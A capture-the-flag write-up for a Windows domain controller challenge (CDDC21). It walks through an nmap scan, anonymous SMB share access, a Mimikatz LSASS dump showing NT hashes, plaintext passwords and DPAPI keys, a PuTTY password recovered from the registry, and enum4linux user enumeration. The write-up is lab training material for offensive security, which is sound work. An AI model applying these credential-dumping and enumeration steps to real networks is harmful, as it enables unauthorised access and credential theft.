# Behind the Mask \(Windows\)

## Hello Guest

Port scan:

```text
└─# nmap -sC -sV -v -Pn 54.255.213.169
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-24 02:10:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: GDC)
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GDC
|   NetBIOS_Domain_Name: GDC
|   NetBIOS_Computer_Name: GDC-DC-J
|   DNS_Domain_Name: gdc.local
|   DNS_Computer_Name: GDC-DC-J.gdc.local
|   DNS_Tree_Name: gdc.local
|   Product_Version: 10.0.14393
|_  System_Time: 2021-06-24T02:10:15+00:00
| ssl-cert: Subject: commonName=GDC-DC-J.gdc.local
| Issuer: commonName=GDC-DC-J.gdc.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-06-16T15:44:01
| Not valid after:  2021-12-16T15:44:01
| MD5:   4af0 4092 e460 3e66 22e0 bfd2 201d ab7a
|_SHA-1: 7c57 5c74 5cc7 ea3e a9ee 0d19 159f 4638 6bcf b1ec
|_ssl-date: 2021-06-24T02:10:55+00:00; 0s from scanner time.
Service Info: Host: GDC-DC-J; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results: 
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: GDC-DC-J
|   NetBIOS computer name: GDC-DC-J\x00
|   Domain name: gdc.local
|   Forest name: gdc.local
|   FQDN: GDC-DC-J.gdc.local
|_  System time: 2021-06-24T02:10:18+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-06-24T02:10:19
|_  start_date: 2021-06-22T10:01:52
```

### **SMB Shares**

```text
└─# smbclient -U '' -L \\\\54.255.213.169
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backup          Disk      
        C$              Disk      Default share
        Forensics1      Disk      
        Forensics2      Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

Connect to Backup share with no username.

`CDDC21{0LLHE_Gue$T}`

## Old Memories

Credentials: `alexander.p:v#X1nOLqPZ`

Access Forensics1 using these credentials. There is an LSASS dump, which we can use Mimikatz to interpret. This gives us the credentials `John:#johnIStheBEST!`.

```text
        == MSV ==
                Username: Flag
                Domain: DESKTOP-2QFHHML
                LM: NA
                NT: 596c4994f88d93d0718bdea487092f11
                SHA1: 45b9d6c67c871a7c763e3a062c8e0684415e6834
        == WDIGEST [e0b3a]==
                username Flag
                domainname DESKTOP-2QFHHML
                password CDDC21{lsa$$_DUMP_password}
        == Kerberos ==
                Username: Flag
                Domain: DESKTOP-2QFHHML
                Password: None
        == WDIGEST [e0b3a]==
                username Flag
                domainname DESKTOP-2QFHHML
                password CDDC21{lsa$$_DUMP_password}
        == DPAPI [e0b3a]==
                luid 920378
                key_guid 9c3ff7d7-c6c0-4d8d-8c0d-7dc7428f80a1
                masterkey 6e95c4172045ea74162063f33065449b683b612d2c52b8db502b8ece05311ff16e18b4a1d737e5fc93eb0882576bc17f85f2f70e0344b6db49600e9a461a2a8f
                sha1_masterkey 06cdbed57b14937ac2008d24a56a423f919a1eb7

== LogonSession ==
authentication_id 195058 (2f9f2)
session_id 1
username John
domainname DESKTOP-2QFHHML
logon_server DESKTOP-2QFHHML
logon_time 2021-06-10T06:44:43.890166+00:00
sid S-1-5-21-2198713953-2006436724-2838398043-1001
luid 195058
        == MSV ==
                Username: John
                Domain: DESKTOP-2QFHHML
                LM: NA
                NT: 53bb900f229aa32d546f54523a96de67 
                SHA1: 1075eeefce15aa2008f2e0594babccc09cdf5d4b
        == WDIGEST [2f9f2]==
                username John
                domainname DESKTOP-2QFHHML
                password #johnIStheBEST!
        == Kerberos ==
                Username: John
                Domain: DESKTOP-2QFHHML
                Password: None
        == WDIGEST [2f9f2]==
                username John
                domainname DESKTOP-2QFHHML
                password #johnIStheBEST!
        == DPAPI [2f9f2]==
                luid 195058
                key_guid 44b05868-2d03-4f04-a2ba-fedd6e3b08f5
                masterkey 359eee0b2409c2d331ece3c70d71b8987d27a6ecf3e08848efeea3eda14c05a044f6efd3201a30cbd7e7c64fdcbb500453b22dd8cc322b2e0c3b0ff7b2850877
                sha1_masterkey 68e0bf11f62251c47a0fa84869946e72224930f5
```

Accessing Forensics2 as John gives us the flag.

`CDDC21{lsa$$_DUMP_password}`

## Register

We are given a registry dump. There is a PuTTy password stored in the registry.

```text
[HKEY_USERS\S-1-5-21-2198713953-2006436724-2838398043-1001\SOFTWARE\SimonTatham\PuTTY\Sessions\flag]

...

"ProxyPassword"="iS_Putty_s3cure?!"

...
```

The flag is `CDDC21{iS_Putty_s3cure?!}`

## Last Note

Listing all the domain users, we find the flag in the description of `henry.s`.

```text
└─$ enum4linux -u alexander.p -p "v#X1nOLqPZ" -U 54.255.213.169
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jun 24 00:22:40 2021

 ==========================
|    Target Information    |
 ==========================
Target ........... 54.255.213.169
RID Range ........ 500-550,1000-1050
Username ......... 'alexander.p'
Password ......... 'v#X1nOLqPZ'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

...

 =============================== 
|    Users on 54.255.213.169    |
 =============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10ab RID: 0x461 acb: 0x00000010 Account: adrian.c      Name: Collins, Adrian   Desc: Programer at GDC
index: 0x10ae RID: 0x464 acb: 0x00000010 Account: alexander.p   Name: Perry, Alexander  Desc: Help Desk
index: 0x10a9 RID: 0x45f acb: 0x00000010 Account: andy.g        Name: Goode, Andrew     Desc: Algorithms at GDC
index: 0x10a8 RID: 0x45e acb: 0x00000010 Account: ci_admin      Name: Admin, CI Desc: Continuous Integration Admin
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10a2 RID: 0x458 acb: 0x00000010 Account: henry.s       Name: Stewart, Henry    Desc: CDDC21{We!!_D0NE}
index: 0x10a3 RID: 0x459 acb: 0x00000010 Account: jacob.c       Name: Coleman, Jacob    Desc: Customer Success Manager
index: 0x10b3 RID: 0x468 acb: 0x00000210 Account: john  Name: john      Desc: (null)
index: 0x10ac RID: 0x462 acb: 0x00000010 Account: john.m        Name: Miller, John      Desc: Programer at GDC
index: 0x10aa RID: 0x460 acb: 0x00000010 Account: justin.t      Name: Tuck, Justin      Desc: Programer at GDC
index: 0xff5 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10a5 RID: 0x45b acb: 0x00000010 Account: marcus.w      Name: Wright, Marcus    Desc: Researcher at GDC
index: 0xfbf RID: 0x3f0 acb: 0x00000210 Account: root   Name: root      Desc: (null)
index: 0x10ad RID: 0x463 acb: 0x00000010 Account: ryan.b        Name: Butler, Ryan      Desc: Help Desk Manager
index: 0x10a4 RID: 0x45a acb: 0x00000010 Account: serena.k      Name: Kagan, Serena     Desc: Researcher at GDC
index: 0x10af RID: 0x465 acb: 0x00000010 Account: svc_admin     Name: , SVC     Desc: Service admin account
index: 0x10a6 RID: 0x45c acb: 0x00000010 Account: thomas.p      Name: Parnell, Thomas   Desc: Researcher at GDC
index: 0x10a7 RID: 0x45d acb: 0x00000010 Account: vick.c        Name: Chamberlain, Vick Desc: Researcher at GDC

...
```

The flag is `CDDC21{We!!_D0NE}`

